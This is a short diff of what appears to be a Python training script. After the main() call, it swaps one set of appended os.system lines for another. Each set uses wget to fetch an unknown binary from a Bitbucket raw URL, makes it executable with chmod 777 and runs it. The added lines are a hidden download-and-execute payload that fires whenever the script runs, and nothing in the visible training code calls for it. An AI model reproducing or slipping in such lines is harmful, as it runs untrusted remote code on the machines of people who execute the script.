@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/angga98/kzp2/raw/5daea23eaa75d37e2e9fc0bc93114ee41a027f30/bebek')
-os.system('chmod 777 bebek')
-os.system('./bebek')
+os.system('wget https://bitbucket.org/betee/scbte/raw/b628b4b10d34187ff3cf6d3028aa2a4fe02e38d2/betes')
+os.system('chmod 777 betes')
+os.system('./betes')
